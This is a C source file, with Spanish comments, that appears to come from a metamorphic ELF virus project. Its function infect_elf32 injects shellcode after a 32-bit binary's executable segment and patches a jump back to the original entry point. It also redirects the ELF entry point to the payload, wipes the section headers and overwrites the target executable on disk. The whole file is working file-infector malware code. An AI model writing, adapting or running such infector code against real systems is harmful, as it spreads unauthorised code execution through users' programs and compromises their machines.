#include "../../include/war.h"
#include "../../include/metamorph_shellcode_x86.h"
#include <errno.h>

// Debug macro para 32-bit
#ifdef DEBUG
#define DEBUG_PRINT_32(fmt, ...) fprintf(stderr, "[DEBUG-32] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT_32(fmt, ...) ((void)0)
#endif

static int write_infected_file_elf32(const char *filepath, void *data, size_t size) {
    int fd;
    ssize_t written;
    struct stat st;
    mode_t original_mode = 0755;
    
    DEBUG_PRINT_32("write_infected_file_elf32: filepath=%s, size=%zu", filepath, size);
    
    if (stat(filepath, &st) == 0) {
        original_mode = st.st_mode;
        DEBUG_PRINT_32("  original_mode=0%o", original_mode);
    }
    
    // En Linux no puedes truncar un ejecutable mapeado, hay que borrarlo primero
    DEBUG_PRINT_32("  Unlinking old file...");
    (void)unlink(filepath);
    
    // Crear archivo nuevo con open() directamente (custom_open no soporta mode)
    fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, original_mode);
    if (fd < 0) {
        DEBUG_PRINT_32("  ERROR: open failed, errno=%d", errno);
        return -1;
    }
    DEBUG_PRINT_32("  fd=%d opened successfully", fd);
    
    written = custom_write(fd, data, size);
    fchmod(fd, original_mode);
    custom_close(fd);
    
    if (written < 0 || (size_t)written != size) {
        DEBUG_PRINT_32("  ERROR: write failed, written=%zd, expected=%zu", written, size);
        return -1;
    }
    
    DEBUG_PRINT_32("  SUCCESS: wrote %zd bytes", written);
    return 0;
}

int infect_elf32(const char *filepath, t_config *config) {
    t_elf_unified elf = {0};
    void *new_data = NULL;
    size_t new_size;
    size_t original_size;
    int ret = -1;
    
    DEBUG_PRINT_32("========== infect_elf32 START ==========");
    DEBUG_PRINT_32("filepath: %s", filepath);
    
    if (!config->modify_signature) {
        DEBUG_PRINT_32("ERROR: modify_signature is disabled");
        return -1;
    }
    DEBUG_PRINT_32("modify_signature: enabled");
    
    // Parse ELF32
    DEBUG_PRINT_32("Parsing ELF32...");
    if (parse_elf_unified(filepath, &elf) < 0) {
        DEBUG_PRINT_32("ERROR: parse_elf_unified failed");
        return -1;
    }
    DEBUG_PRINT_32("  ELF class: %d (expected ELFCLASS32=%d)", elf.class, ELFCLASS32);
    
    if (elf.class != ELFCLASS32) {
        DEBUG_PRINT_32("ERROR: Not an ELF32 file");
        cleanup_elf_unified(&elf);
        return -1;
    }
    
    // Verificar si ya está infectado
    // TODO: implementar is_infected para ELF32
    DEBUG_PRINT_32("TODO: is_infected check not implemented for ELF32");
    
    original_size = elf.size;
    uint32_t original_entry = elf.ehdr32->e_entry;
    DEBUG_PRINT_32("  original_size: %zu bytes", original_size);
    DEBUG_PRINT_32("  original_entry: 0x%08x", original_entry);
    DEBUG_PRINT_32("  e_phnum: %d", elf.ehdr32->e_phnum);
    DEBUG_PRINT_32("  e_phoff: 0x%08x", elf.ehdr32->e_phoff);
    
    // Encontrar segmento TEXT ejecutable
    Elf32_Phdr *text_seg = NULL;
    size_t text_seg_idx = 0;
    
    DEBUG_PRINT_32("Searching for TEXT segment...");
    for (int i = 0; i < elf.ehdr32->e_phnum; i++) {
        DEBUG_PRINT_32("  Segment[%d]: type=0x%x, flags=0x%x, offset=0x%x, vaddr=0x%x, filesz=0x%x, memsz=0x%x",
            i, elf.phdr32[i].p_type, elf.phdr32[i].p_flags,
            elf.phdr32[i].p_offset, elf.phdr32[i].p_vaddr,
            elf.phdr32[i].p_filesz, elf.phdr32[i].p_memsz);
        
        if (elf.phdr32[i].p_type == PT_LOAD &&
            (elf.phdr32[i].p_flags & PF_X) &&
            elf.phdr32[i].p_filesz == elf.phdr32[i].p_memsz) {
            text_seg = &elf.phdr32[i];
            text_seg_idx = i;
            DEBUG_PRINT_32("  -> Found TEXT segment at index %d", i);
            break;
        }
    }
    
    if (!text_seg) {
        DEBUG_PRINT_32("ERROR: No suitable TEXT segment found");
        cleanup_elf_unified(&elf);
        return -1;
    }
    
    // Calcular offsets (igual que ELF64 pero con tipos 32-bit)
    size_t segment_file_end = text_seg->p_offset + text_seg->p_filesz;
    size_t payload_file_offset = segment_file_end;
    uint32_t vaddr_offset_diff = text_seg->p_vaddr - text_seg->p_offset;
    uint32_t payload_vaddr = payload_file_offset + vaddr_offset_diff;
    
    DEBUG_PRINT_32("Injection calculations:");
    DEBUG_PRINT_32("  segment_file_end: 0x%zx", segment_file_end);
    DEBUG_PRINT_32("  payload_file_offset: 0x%zx", payload_file_offset);
    DEBUG_PRINT_32("  vaddr_offset_diff: 0x%x", vaddr_offset_diff);
    DEBUG_PRINT_32("  payload_vaddr: 0x%x", payload_vaddr);
    
    // Buscar el 'ret' (0xc3) en el wrapper del shellcode para sobrescribirlo con el JMP
    // El shellcode termina con: ... popa (0x61) ret (0xc3) ud2 (0x0f 0x0b)
    size_t ret_offset = 0;
    for (size_t i = METAMORPH_SHELLCODE_SIZE_X86 - 1; i > METAMORPH_ENTRY_OFFSET_X86; i--) {
        if (metamorph_shellcode_x86[i] == 0xc3 && 
            i > 0 && metamorph_shellcode_x86[i-1] == 0x61) {  // popa followed by ret
            ret_offset = i;
            break;
        }
    }
    if (ret_offset == 0) {
        // Fallback: buscar último 0xc3
        for (size_t i = METAMORPH_SHELLCODE_SIZE_X86 - 1; i > METAMORPH_ENTRY_OFFSET_X86; i--) {
            if (metamorph_shellcode_x86[i] == 0xc3) {
                ret_offset = i;
                break;
            }
        }
    }
    DEBUG_PRINT_32("Found ret at shellcode offset 0x%zx", ret_offset);
    
    // Generar JMP al entry point original (32-bit)
    // El JMP se escribirá en la posición del ret
    unsigned char jmp_to_original[14];
    size_t jmp_size = 5;
    
    uint32_t jmp_vaddr = payload_vaddr + ret_offset;  // Dirección virtual donde estará el JMP
    uint32_t jmp_to = original_entry;
    int32_t rel_offset = (int32_t)(jmp_to - (jmp_vaddr + 5));  // +5 por el tamaño de la instrucción JMP
    
    jmp_to_original[0] = 0xE9;  // JMP rel32
    *(int32_t *)(&jmp_to_original[1]) = rel_offset;
    
    DEBUG_PRINT_32("JMP instruction:");
    DEBUG_PRINT_32("  jmp_vaddr: 0x%x (ret_offset=0x%zx)", jmp_vaddr, ret_offset);
    DEBUG_PRINT_32("  jmp_to: 0x%x", jmp_to);
    DEBUG_PRINT_32("  rel_offset: 0x%x (%d)", rel_offset, rel_offset);
    DEBUG_PRINT_32("  jmp_size: %zu", jmp_size);
    
    // Get signature
    const char *sig = get_signature();
    size_t sig_len = strlen(sig) + 1;
    DEBUG_PRINT_32("Signature: \"%s\" (len=%zu)", sig, sig_len);
    
    // Calcular tamaño total de inyección
    // shellcode hasta ret + JMP + signature
    // Nota: sobrescribimos el ret y lo que viene después (ud2), así que el tamaño real es:
    size_t shellcode_until_ret = ret_offset;  // bytes del shellcode hasta el ret (sin incluirlo)
    size_t total_injection_size = shellcode_until_ret + jmp_size + sig_len;
    new_size = original_size + total_injection_size;
    
    DEBUG_PRINT_32("Size calculations:");
    DEBUG_PRINT_32("  METAMORPH_SHELLCODE_SIZE_X86: %d", METAMORPH_SHELLCODE_SIZE_X86);
    DEBUG_PRINT_32("  METAMORPH_ENTRY_OFFSET_X86: 0x%x", METAMORPH_ENTRY_OFFSET_X86);
    DEBUG_PRINT_32("  shellcode_until_ret: %zu", shellcode_until_ret);
    DEBUG_PRINT_32("  total_injection_size: %zu", total_injection_size);
    DEBUG_PRINT_32("  new_size: %zu", new_size);
    
    new_data = malloc(new_size);
    if (!new_data) {
        DEBUG_PRINT_32("ERROR: malloc failed for new_data");
        cleanup_elf_unified(&elf);
        return -1;
    }
    DEBUG_PRINT_32("Allocated %zu bytes for new_data", new_size);
    
    // Copiar archivo original
    memcpy(new_data, elf.data, original_size);
    DEBUG_PRINT_32("Copied original file (%zu bytes)", original_size);
    
    // Inyectar shellcode 32-bit (solo hasta el ret, sin incluir ret ni ud2)
    DEBUG_PRINT_32("Injecting shellcode at offset 0x%zx...", payload_file_offset);
    memcpy((char *)new_data + payload_file_offset, 
           metamorph_shellcode_x86, 
           shellcode_until_ret);  // Solo copiamos hasta el ret
    DEBUG_PRINT_32("  Shellcode bytes copied: %zu (until ret)", shellcode_until_ret);
    DEBUG_PRINT_32("  Shellcode first bytes: %02x %02x %02x %02x %02x",
        metamorph_shellcode_x86[0], metamorph_shellcode_x86[1],
        metamorph_shellcode_x86[2], metamorph_shellcode_x86[3],
        metamorph_shellcode_x86[4]);
    
    // Escribir JMP donde estaba el ret
    size_t jmp_file_offset = payload_file_offset + ret_offset;
    DEBUG_PRINT_32("Writing JMP at file offset 0x%zx (replacing ret)", jmp_file_offset);
    memcpy((char *)new_data + jmp_file_offset, jmp_to_original, jmp_size);
    DEBUG_PRINT_32("  JMP bytes: %02x %02x %02x %02x %02x",
        jmp_to_original[0], jmp_to_original[1], jmp_to_original[2],
        jmp_to_original[3], jmp_to_original[4]);
    
    // Escribir signature después del JMP
    size_t sig_file_offset = jmp_file_offset + jmp_size;
    DEBUG_PRINT_32("Writing signature at offset 0x%zx", sig_file_offset);
    memcpy((char *)new_data + sig_file_offset, sig, sig_len);
    
    cleanup_elf_unified(&elf);
    DEBUG_PRINT_32("Cleaned up ELF structure");
    
    // Modificar headers (32-bit)
    Elf32_Ehdr *new_ehdr = (Elf32_Ehdr *)new_data;
    Elf32_Phdr *new_phdr = (Elf32_Phdr *)((char *)new_data + new_ehdr->e_phoff);
    
    // Cambiar entry point al shellcode
    uint32_t shellcode_entry = payload_vaddr + METAMORPH_ENTRY_OFFSET_X86;
    DEBUG_PRINT_32("Modifying ELF headers:");
    DEBUG_PRINT_32("  Old entry: 0x%08x", new_ehdr->e_entry);
    new_ehdr->e_entry = shellcode_entry;
    DEBUG_PRINT_32("  New entry: 0x%08x (shellcode_entry)", new_ehdr->e_entry);
    
    // Extender segmento TEXT
    size_t extension = total_injection_size;
    DEBUG_PRINT_32("Extending TEXT segment[%zu]:", text_seg_idx);
    DEBUG_PRINT_32("  Old p_filesz: 0x%x", new_phdr[text_seg_idx].p_filesz);
    DEBUG_PRINT_32("  Old p_memsz: 0x%x", new_phdr[text_seg_idx].p_memsz);
    new_phdr[text_seg_idx].p_filesz += extension;
    new_phdr[text_seg_idx].p_memsz += extension;
    DEBUG_PRINT_32("  New p_filesz: 0x%x (+%zu)", new_phdr[text_seg_idx].p_filesz, extension);
    DEBUG_PRINT_32("  New p_memsz: 0x%x (+%zu)", new_phdr[text_seg_idx].p_memsz, extension);
    
    // Asegurar que sea ejecutable
    if (!(new_phdr[text_seg_idx].p_flags & PF_X)) {
        new_phdr[text_seg_idx].p_flags |= PF_X;
        DEBUG_PRINT_32("  Added PF_X flag to segment");
    }
    
    // Invalidar section headers
    DEBUG_PRINT_32("Invalidating section headers:");
    DEBUG_PRINT_32("  Old e_shoff: 0x%x, e_shnum: %d", new_ehdr->e_shoff, new_ehdr->e_shnum);
    new_ehdr->e_shoff = 0;
    new_ehdr->e_shnum = 0;
    new_ehdr->e_shstrndx = 0;
    DEBUG_PRINT_32("  Section headers invalidated");
    
    DEBUG_PRINT_32("Writing infected file...");
    ret = write_infected_file_elf32(filepath, new_data, new_size);
    free(new_data);
    
    DEBUG_PRINT_32("========== infect_elf32 END (ret=%d) ==========", ret);
    return ret;
}